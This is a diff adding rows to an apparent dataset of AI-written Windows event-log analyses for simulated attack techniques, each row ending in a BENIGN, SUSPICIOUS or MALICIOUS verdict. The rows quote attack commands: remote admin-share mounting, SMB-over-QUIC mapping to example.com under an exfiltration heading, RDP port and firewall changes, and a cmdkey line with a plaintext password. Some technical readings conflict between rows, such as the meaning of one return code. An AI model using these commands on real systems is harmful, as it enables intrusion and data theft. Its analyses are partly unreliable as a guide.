+  - Further investigation is warranted. Actions should include verifying the legitimacy of the Edge update source, permissions for Radmin Viewer operations, and confirmed admin tasks related to event log utilities.
+
+#### Guidance:
+
+- **Immediate Actions:**
+  - Verify if the Edge update path configuration is legitimate or altered for the specific context of `Server002`.
+  - Review if `SERVER002\\admin_test` activity aligns with normal scope; if not, conduct a precise check on user activities and permissions.
+  - Trace and validate `Radmin Viewer` accesses and ensure remote access tools follow organizational controls and monitoring.
+
+- **Further Monitoring:**
+  - Maintain log scanning for similar unusual paths or persistent administrative actions.
+  - Consider deployment of alerts for similar activities indicating irregular remote access or usage of administrative scripts."
+Map Admin Share PowerShell,"Analyzing the provided Windows event logs from several sources (System, Windows PowerShell, Sysmon, and Security logs), I aimed to identify signs of suspicious or malicious behavior. Below is a detailed analysis of each relevant portion of the logs:
+
+### System Log:
+1. **Time Adjustments:**
+   - Multiple instances of time adjustment can be observed, initiated by legitimate system processes: `svchost.exe` is responsible for time synchronization with `time.windows.com`.
+   - The changes appear synchronized and typical for timezone or daylight saving adjustments.
+
+2. **Windows Update:**
+   - Successful updates to Microsoft Defender Antivirus were logged. These updates are routine and expected as part of regular security maintenance.
+
+### PowerShell Log:
+- **Command Executions:**
+  - A specific command: `New-PSDrive -name g -psprovider filesystem -root \\Target\C$` is found repeated in PowerShell execution logs.
+  - This command mounts a remote file share, which might be legitimate under certain circumstances but could indicate lateral movement or data access if unauthorized.
+
+### Sysmon Log:
+1. **High Number of Utility Executions:**
+   - Frequent executions of administrative tools like `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `powershell.exe`. 
+   - While these can be typical in an administrative context, the combination and sequence might suggest user profiling or environment enumeration, especially when executed by a non-standard user like `admin_test`.
+
+2. **Process Integrity Levels:**
+   - Processes are running with ""High"" or ""System"" integrity levels, typical for administrative or system tasks.
+
+3. **Edge Update:**
+   - Instances of Microsoft Edge updating itself, with associated update processes that fall within normal system operation routine checks.
+
+### Security Log:
+1. **Logon and Privilege Events:**
+   - Multiple logon events and privilege assignments to user `admin_test`.
+   - Privileges such as `SeSecurityPrivilege`, `SeDebugPrivilege`, and others are granted indicating potential for high privilege execution.
+   - NTLM logons and associated events might indicate internal network activity, plausible for remote desktop management.
+
+2. **Audit Failures:**
+   - Entries of credential reading operations (Event ID 5379) with specific errors (return code `3221226021`) were found. This can indicate unsuccessful attempts to read credential-related data.
+
+### Assessment:
+Overall, the logs show a mix of routine system updates and administrative actions, but the frequency and combination of some activities warrant further investigation.
+
+- **Time adjustments and update logs** appear benign and indicative of regular system behavior to maintain correct time and application versions.
+- The **PowerShell command** is not inherently malicious, but accessing a remote file share might be suspicious if it’s unauthorized.
+- **Frequent execution of system utilities and enumeration commands** by a non-standard user along with attempts to read credentials may suggest unauthorized user profiling or lateral movement attempts.
+- **Privilege assignments and logon patterns** showing use of NTLM across potentially administrative tasks indicate monitoring trustworthiness of actions performed.
+
+### Conclusion:
+Though the activities outlined have elements of standard operations, the combination and context, especially related to PowerShell activity and frequent use of system utilities, suggest a need for deeper investigation into user intents and origin of command executions.
+
+### Resolution:
+**SUSPICIOUS** - Logs contain activities that do not look entirely benign and require further investigation to ensure there is no ongoing compromise. The next steps would involve reviewing access logs, validating user permissions with `admin_test`, checking the origin and authorization of mounted drives, and corroborating activities with user intent."
+Exfiltration Over SMB over QUIC (New-SmbMapping),"Upon analyzing the provided logs, several points of interest arise that require attention to assess whether malicious activity has occurred:
+
+### Suspicious or Anomalous Behavior:
+1. **Frequent wevtutil.exe Execution:**
+   - The logs show multiple instances of `wevtutil.exe` being executed. This utility can be used to clear event logs, which may indicate an attempt to cover tracks if being used suspiciously. The user account `SERVER002\\admin_test` executing this process raises concerns if this user activity is not typically associated with such administration actions.
+
+2. **PowerShell Usage with Suspicious Command:**
+   - An instance of PowerShell is executed with a command that includes `New-SmbMapping -RemotePath '\\\\example.com\\sales' -TransportType QUIC -SkipCertificateCheck`, attempting to map a network drive and, interestingly, skipping certificate checks. This can be a potential security risk, suggesting an unauthorized or insecure attempt to access network resources.
+
+3. **Execution of Hostname and Whoami:**
+   - `hostname.exe` and `whoami.exe` are executed, which could be benign if part of normal scripts or diagnostics, but they might also be used by an attacker to reconfirm the environment they are operating within, especially when seen together.
+
+4. **Edge Update Frequency and Temp File Usage:**
+   - There are multiple executions of Edge update processes, including some from within a temporary directory. While these might be legitimate updates, the behavior should be cross-verified with known update patterns to rule out potential misuse of the executable.
+   
+5. **Modification of System Time:**
+   - There is a recorded system time change by `svchost.exe`, which can be normal under certain circumstances (like daylight saving changes), but may also indicate malicious manipulation of logs' timestamps.
+
+### Threats or Risks Identified:
+- The most significant risk is from the PowerShell script that skips certificate checks when mapping a network drive, which could expose the system to potential man-in-the-middle attacks or unauthorized data access.
+- The use of system utilities (e.g., `wevtutil.exe`) by non-typical accounts for potentially clearing logs implies possible cover-up attempts.
+- Network drive mappings without secure verification constitute a risk of unauthorized data exposure or data theft.
+
+### Guidance on How to Proceed:
+- **Further Investigation (Recommended):** Given the suspicious nature of the `PowerShell` command and the repeated use of `wevtutil.exe`, further investigation is warranted. Investigate the user `SERVER002\\admin_test` for unusual recent activity and authenticate its legitimacy.
+- **Network ACLs Review:** Ensure that network shares and the use of utilities like `conhost.exe` and `whoami.exe` are in line with the organization's security policies.
+- **Review of Update Procedures:** Verify that the Edge update processes align with expected behavior and schedules. Check for any tampering or abnormal executions, especially from temporary directories.
+
+### Resolution: SUSPICIOUS
+The activities documented warrant further investigation due to their potential for misuse and deviation from typical benign use patterns. Verification and additional analysis are necessary to confirm that these actions are either valid or potentially malicious."
+Copy and Execute File with PsExec,"Upon reviewing the provided logs, several points of interest emerge that could indicate potentially malicious activity:
+
+1. **Execution of PsExec Service (`PSEXESVC`)**:
+   - **System Log**: Deployment of the `PSEXESVC` service is recorded (Event ID 7045), which is a hallmark of PsExec usage. PsExec is a legitimate administrative tool used for remote execution but is often considered suspicious if found without a justified administrative task, especially on high-value targets like the CEO's machine.
+   - **Sysmon Log**: `C:\Windows\PSEXESVC.exe` is seen in the logs, corroborating the potential use of PsExec.
+
+2. **Execution of Suspicious Commands**:
+   - **Sysmon Log**: The presence of `cmd.exe`, `whoami.exe`, and `psxec` scripts from a temporary directory suggests scripts might be executing without explicit user consent. The command line includes `C:\Users\ADMIN_~1\AppData\Local\Temp\Externalfiles\script.exe`, hinting at potentially dangerous operations.
+
+3. **Administrative Privilege Escalation**:
+   - **Security Log (Event ID 4672)**: The `admin_test` account is granted a list of high-level privileges, including `SeDebugPrivilege`, which can be indicative of attempts to elevate privileges or perform debug operations that should be scrutinized further.
+
+4. **Network Logon with NTLM Authentication**:
+   - **Security Log (Event ID 4624)**: A remote logon with NTLM, especially from an unspecified workstation, coupled with elevated privileges could point to lateral movement or remote execution attempts.
+
+5. **Frequent Updates and Software Installations**:
+   - **Sysmon Log**: Multiple installations and updates of Microsoft Edge binaries appear. While these could be legitimate, the timing and frequency should be examined against any scheduled maintenance or updates.
+
+Based on these observations, the activities recorded in the logs could potentially indicate the misuse of administrative tools like PsExec for unauthorized remote execution, privilege escalation practices, and potential unauthorized or suspicious logon sessions.
+
+### Resolution: SUSPICIOUS
+These findings suggest activities that merit further investigation to rule out malicious intent:
+- Verify the legitimacy of PsExec deployments and their alignment with any administrative tasks.
+- Confirm whether installations and network activities are scheduled updates or unexpected behaviors.
+- Investigate the `admin_test` account's activities and the contexts of NTLM authentication logs to ensure no lateral movements or unauthorized remote executions occurred.
+
+Next steps should include engaging with the IT security to carry out deeper forensic analysis, assess the integrity of accessed data, and validate user accounts and logins during the suspect period."
+Changing RDP Port to Non Standard Port via Powershell,"After a thorough analysis of the provided Windows event logs, the following observations and assessments were made:
+
+### Security Logs
+- The EventID 5379 indicates detailed tracking of credential manager operations. One notable aspect here is the consistent return code `3221226021`, which translates to ""The specified user does not have a valid profile."" This occurrence doesn't inherently suggest malicious activity; rather, it indicates failed attempts which could be due to incorrect configurations or attempts to access resources with insufficient permissions.
+
+### System Logs
+- The system logs primarily depict regular system operations, such as Windows Update activities. There are no clear indications of suspicious activities in the system log entries.
+
+### Sysmon Logs
+- The logs indicate activities such as execution of `whoami.exe`, `wevtutil.exe`, and `hostname.exe`, which are normal utilities for administrative tasks. However, the repeated invocation of these commands could suggest reconnaissance activities, especially if not initiated by the legitimate user.
+- The execution of `powershell.exe` with command-line parameters to change RDP port and create a new firewall rule is highly suspicious. The command aims to change the default RDP port from 3389 to 4489 and allows inbound RDP connections via a new firewall rule, possibly evading detection by using a non-standard port.
+
+### Application and Windows PowerShell Logs
+- The PowerShell commands executed confirm changes to the system's RDP configuration, as detailed in the Sysmon logs. The timing and nature of these actions suggest unauthorized modification of RDP settings, pointing towards potential malicious activity aimed at establishing persistent remote access.
+
+### Assessment
+- **Suspicious Behavior:** The execution of PowerShell with commands to alter RDP settings and firewall rules represents an attempt to configure the system for remote access using potentially unauthorized means. While the execution of administrative utilities alone is not suspicious, in context with RDP modifications, it can reflect malicious intentions.
+
+### Conclusion
+Given the activities logged, particularly concerning the PowerShell commands to modify RDP settings, there is strong evidence that suggests suspicious behavior requiring further investigation to confirm the legitimacy of these actions. Thus, the resolution for this event log analysis is marked as:
+
+**SUSPICIOUS**
+
+### Guidance
+1. **Immediate Response:**
+   - Disable the newly opened RDP port (4489) and revert any firewall rules that permit unapproved access.
+   - Verify any recent account changes or permission modifications on the involved machine.
+2. **Further Investigation:**
+   - Review user account activities around the log's timestamp to check for unauthorized access.
+   - Execute hunts for any other indicators of compromise or persistence mechanisms.
+   - Evaluate related systems for any signs of lateral movement.
+
+3. **Preventive Measures:**
+   - Educate users regarding secure remote access practices.
+   - Implement stricter monitoring and alerts for changes to critical system configurations like RDP and firewall settings."
+PDQ Deploy RAT,"## Analysis of the Logs:
+
+1. **Security Log**:
+   - No entries provided, unable to analyze security log events.
+
+2. **System Log**:
+   - Event ID 7045 (Service Control Manager): Indicates that the PDQ Deploy Service was installed and the service was created. Notably, this service is set to ""disabled"" and runs under the LocalSystem account.
+   - Series of Event ID 44 (Windows Update Client): Logs showing the installation of updates
+
+3. **Windows PowerShell Log**:
+   - Event ID 403: A PowerShell script was executed to download and install PDQ Deploy installer using “Invoke-WebRequest” and “Start-Process” with the silent installation flag `""/s""`. This behavior is unusual and could potentially be used for executing unauthorized software installations.
+   - Event ID 600: Shows attempts to execute PowerShell commands, with restricted execution policy, likely as part of internal administrative tasks or an evaluation script.
+
+4. **Sysmon Log**:
+   - Multiple instances of `wevtutil.exe` and `conhost.exe` executions around the same time as the PowerShell activity. `wevtutil` is often used to query or manipulate event logs, which could be of interest if malicious actors were trying to clear traces. However, the reference to specific admin users conducting this reduces severity.
+   - `msiexec.exe` was used, possibly for PDQ Deploy installation, as reflected in the application logs.
+   - `whoami.exe` and `hostname.exe` execution represents commands for querying user and system information - these are benign if used internally for diagnostics but can be suspicious if unauthorized.
+
+5. **Application Log**:
+    - Event IDs 11707 and 1033: Installation of PDQ Deploy was completed successfully, corroborating observed PowerShell and msiexec activity.
+
+## Assessment:
+
+- The deployment of PDQ Deploy via scripted PowerShell activity is noteworthy. While PDQ Deploy is a legitimate application often used for software deployment across devices, the method of its initiation suggests normal use requires confirmation. It was downloaded from an authoritative URL, and the install log indicates successful deployment.
+- There's significant overlap between PowerShell operations, `wevtutil` executions, and PDQ Deploy installation. The logs could suggest either scripted automated deployments or less sanctioned installs, possibly for lateral movement or administrative setup.
+  
+## Guidance:
+
+- **Further Steps Needed**: Verify with IT or the service desk if there was planned maintenance involving PDQ Deploy on the specified date. Confirm legitimacy with relevant IT policies or planned activities for PDQ Deploy.
+- **Containment and Evaluation**: If unauthorized, determine the source of the PowerShell script initiation, validate configurations of affected hosts, and review security patches.
+- **Logging and Monitoring**: Ensure fine-grained Sysmon logging captures such activities with context, allowing recognition of patterns or deviations, particularly with administrative scripts.
+
+## Resolution: 
+- **SUSPICIOUS** - The activity suggests legitimate, though unchecked administrative tasks or potential security oversights needing further departmental confirmation and examination."
+Deploy 7-Zip Using Chocolatey,"Upon reviewing the provided Windows event logs, the following observations can be made:
+
+1. **Microsoft Edge Update Activity**:
+   - There are multiple events related to the operation of the `MicrosoftEdgeUpdate.exe` process. This is observed in the Sysmon logs, where the Microsoft Edge Update service is starting and stopping, installing updates, and executing update processes.
+   - Edge updates are routine activities for updating the browser and its components. The events display execution under the `NT AUTHORITY\SYSTEM` user, which is standard for system services. The frequent execution of `MicrosoftEdgeUpdate.exe` with various command-line arguments aligns with typical operations for updating software.
+
+2. **PowerShell Activity**:
+   - The PowerShell logs show a command executed to deploy 7-Zip using Chocolatey: `powershell.exe & {# Deploy 7-Zip using Chocolatey, choco install -y 7zip}`.
+   - Installing software using Chocolatey via PowerShell is a common practice in environments that use package managers for application deployment.
+   - The command is executed by the user `SERVER002\admin_test`, which suggests a legitimate administrative action.
+
+3. **Other Notable Processes**:
+   - Execution of standard Windows utilities such as `wevtutil.exe`, `whoami.exe`, and `HOSTNAME.EXE` were observed. These processes are typically benign and, in the absence of additional suspicious context, are considered regular system operations.
+   - The presence of `TiWorker.exe` and `TrustedInstaller.exe` indicates ongoing Windows servicing activities, which are typical for system updates and maintenance operations.
+
+4. **Absence of Security Logs**:
+   - The absence of security events makes it difficult to assess anomalies related to logon attempts, privilege escalations, or credential access that could suggest malicious activity.
+
+**Assessment**:
+- The activities logged appear to be part of routine system maintenance and application updates, which are expected in an enterprise environment.
+- There are no direct indicators of compromise or malicious activity found in the logs provided.
+
+**Resolution**: BENIGN
+
+**Guidance**: 
+- Continually monitor system logs for unusual activities or errors that could indicate an issue. 
+- Ensure that EDR alerts and anomaly detections are coupled with adequate context for further investigation by security teams.
+- Regularly review and update security baselines and training around identifying anomalous behavior specific to your environment.
+"
+Changing RDP Port to Non Standard Port via Command_Prompt,"```plaintext
+**Analysis of Event Logs:**
+
+1. **Time Synchronization:**
+   - **Security Events 4616** and **System Events 1** indicate time changes. These synchronization events, executed by svchost.exe (3720 – a normal system process), show time adjustments. This activity alone is not suspicious as time synchronization is a routine OS function executed by Windows Time Service.
+
+2. **High Privilege Logon by an Unrecognized User:**
+   - **Security Event 4624**: Logon by ""admin_test"" using NTLM from an IP address (fe80::e3b5:5371:12a8:9c77) is noteworthy. 
+   - **Security Event 4672**: Following the logon, privileges like `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege` among others are requested. These privileges enable the potential for significant system actions, usually required for administrative tasks but could be misused.
+   - The username ""admin_test"" indicates a test or temporary account, potentially left unused. Checking its necessity and ensuring it's for a legitimate purpose is advised.
+
+3. **Suspicious Process Activity:**
+   - **Sysmon Events** show processes such as `whoami.exe`, `cmd.exe` using `reg.exe` and `netsh.exe` to alter RDP settings and firewall rules. The command-line arguments involved are `reg add` to modify RDP port from the default 3389 to 4489 and `netsh` commands to grant the new port firewall access. These actions are typically associated with attempts to bypass monitoring or intrusion efforts.
+   - `wevtutil.exe` frequently appears, commonly used for event log manipulation, indicating potential log tampering attempts by `admin_test`.
+
+4. **Edge Update Activities:**
+   - Repeated `setup.exe` executions for Microsoft Edge updates (non-threatening) via normal processes and legitimate paths. These show valid software update operations.
+
+5. **Failed Credential Access Attempt:**
+   - **Security Events 5379** show failed attempts to read credentials for MicrosoftAccount:user=02txoixylodcstop. While return code `3221226021` indicates 'Access Denied', these are made by `SERVER002$`, suggesting routine system service checks.
+
+**Assessment:**
+
+The presence of high privilege assignments to a suspicious account, manipulation of RDP settings, and potential event log tampering without valid justification suggest unauthorized activity. 
+
+**Resolution: MALICIOUS**
+
+**Guidance:**
+
+- **Immediate Actions:**
+  - Disable or remove the ""admin_test"" account unless verified for valid use.
+  - Investigate the source IP related to the logon event.
+  - Review recent RDP connection logs for further findings of external intrusions.
+  - Validate alterations if they align with internal policy or procedures.
+  - Check system files and backup integrity.
+
+- **Proactive Measures:**
+  - Determine if RDP access is necessary, and potentially consider the necessity of internet exposure.
+  - Conduct internal security checks to locate any unauthorized tools or utilities.
+  - Ensure proper logging and monitoring are in place.
+  - Educate IT personnel on privilege usage and the dangers of unnecessary high privileges.
+```
+"
+RDP to DomainController,"### Analysis of Windows Event Logs:
+
+#### Observations:
+
+1. **Repeated Events 5379**:
+    - Numerous Event ID 5379 logs are recorded with a `ReturnCode` of `3221226021`, suggesting a failed operation related to credential reading or retrieval. This occurs repeatedly, indicating a potential issue but not inherently malicious. The username `MicrosoftAccount:user=02txoixylodcstop` is unusual, suggesting potential probing or misconfiguration related to Microsoft credentials.
+
+2. **Process Creation Events**:
+    - **PowerShell Execution**:
+        - There are instances where PowerShell was executed with the command to establish an RDP connection using `cmdkey` and `mstsc`. The command string used includes hard-coded credentials (`1password2!`), which indicates a possible security lapse as plaintext credentials are being utilized.
+  
+    - **Credential Manager Usage**:
+        - The usage of `cmdkey.exe` without obfuscation to store credentials programmatically is observed. This suggests possible unauthorized or scripted usage of credentials to automate RDP connections, potentially for lateral movement or persistence.
+    
+    - **Remote Desktop Connection (mstsc.exe)**:
+        - `mstsc.exe` is executed to establish RDP connections using the credentials set by `cmdkey`, as part of the script executed by PowerShell.
+    
+3. **Privileged Operations**:
+    - There are Event IDs 4672 indicating the assignment of special privileges to the SYSTEM account. While SYSTEM naturally has extensive privileges, it's important to ensure these privileges are not being improperly leveraged for lateral movement or other attacks. This event, in itself, is not uncommon.
+
+4. **Windows Update and System Activities**:
+    - System logs show normal activities related to Windows Update and other software maintenance tasks which are expected on managed systems. No anomalies in this section.
+
+#### Suspicious Patterns:
+- The PowerShell script with embedded credentials and multiple attempts to initiate an RDP session is definitely **suspicious**. This could be indicative of an unauthorized attempt to gain foothold or move laterally within the network.
+- The repeated credential-related Event ID 5379 without successful operations and the suspicious nature of the username `02txoixylodcstop` warrant attention to possible credential misconfigurations or explorations by unauthorized entities.
+
+#### Conclusion:
+The logs reveal **suspicious** activity patterns particularly around the execution of PowerShell scripts and credential management. Such actions typically align with automated scripts used in penetration testing or malicious exploitation.
+
+#### Guidance:
+1. **Immediate Actions**:
+    - Disable the user account `admin_test` pending investigation to prevent further exploitation.
+    - Review and possibly remove cached credentials using `cmdkey /list` to ensure no unauthorized creds are retained.
+    - Conduct a thorough review of Group Policies and system scripts for unauthorized additions or changes.
+
+2. **Further Investigations**:
+    - Scrutinize network traffic from Server002 for any unauthorized data exfiltration or unusual connectivity.
+    - Investigate lateral movement attempts, focusing on other systems accessed using the same credentials.
+    - Perform a security review of scripts and administrative actions to assess potential insider threats.
+
+3. **Enhancements and Controls**:
+    - Implement audits for PowerShell execution, particularly logging command-line arguments and changes made.
+    - Enforce strict policies on credential handling and usage of `cmdkey`, leveraging role-based access controls.
+    - Enhance monitoring with alerts for suspicious PowerShell and RDP activities, utilizing endpoint detection tools.
+
+**Resolution Status: SUSPICIOUS** - The identified activities represent an anomaly needing further investigation to discern intent and extent."
+PowerShell Lateral Movement Using Excel Application Object,"Upon analyzing the provided event logs from the System, Windows PowerShell, and Sysmon channels, several indicators suggest suspicious and potentially malicious activities.
+
+### Analysis:
+
+#### 1. **PowerShell Execution:**
+   - **Command Involved:**  
+     The PowerShell logs indicate an execution with command lines involving `powershell.exe` that attempts to copy `calc.exe` to a new location named `foxprow.exe` in the user's AppData directory. This is a classic sign of suspicious behavior, potentially indicating an attempt to masquerade a known binary to disguise it or run unauthorized code under a legitimate process name.
+   - **COM Object Creation:**  
+     The same PowerShell command line involves the creation of a COM object with `Excel.Application`. Such activities are frequently seen in fileless malware techniques where existing software components are hijacked for malicious purposes.
+
+#### 2. **Process Creation (Sysmon):**
+   - **Processes Executed:**  
+     The Sysmon events list several process creations associated with `powershell.exe`, aligning with the suspicious PowerShell activities. Also, the use of `conhost.exe` suggests the subprocesses of command host executions are spawned along with the PowerShell processes, which might be part of a script obfuscation or execution scenario.
+   - **High Integrity Level:**  
+     The processes are executed with a high integrity level, indicating elevated privileges that could potentially be used for privilege escalation or to perform sensitive operations not allowed to regular users.
+   - **Repeated Use of Conhost:**  
+     Multiple entries showing `conhost.exe` being executed as a child process for `PowerShell` solidify the suspicion of potential misuse of console utilities for obfuscation or command execution.
+
+#### 3. **Failing Copy Operation:**
+   - A failing `CopyItem` operation from `calc.exe` to `foxprow.exe` was recorded, with a warning in the PowerShell logs. This indicates either a test operation by malware that failed (possibly indicating a benign environment) or an incomplete setup of a malicious payload.
+   
+#### 4. **Legitimate Updates:**
+   - The activities related to `wuauclt.exe`, `MpSigStub.exe`, and the execution of components under the `MicrosoftEdgeUpdate.exe` name appear to be consistent with legitimate update operations for Microsoft Defender and Edge. However, given the context of prior suspicious activities, this might be used as a cover for other activities or simply coincidental alongside legitimate system operations.
+
+### Conclusion & Recommendations:
+
+- **Resolution:** The logs contain activity that is potentially **MALICIOUS**. The use of PowerShell scripts to execute unusual file operations, the involvement of COM objects, and obfuscation via `conhost.exe` are indicators that, under the assumption of a compromised environment, are highly suspect.
+  
+- **Next Steps:**
+  - Immediately isolate the affected system (Server002) from the network to prevent possible lateral movement.
+  - Conduct a thorough investigation on the user `SERVER002\admin_test` to understand whether unauthorized access occurred or if the account has been misused.
+  - Review the contents of the scripts executed in PowerShell and any newly created or modified files in the specified directories for further evidence of malicious intent or payloads.
+  - Inspect firewall and network logs for any unusual outbound connections from Server002 around the event's timelines.
+  - Update and run full antivirus and malware scans, using the threat intelligence gathered from the suspicious activities as part of heuristic-based detection and cleaning procedures.
+
+By addressing these points, the security posture can be corrected, and further compromise across the organization can be mitigated."
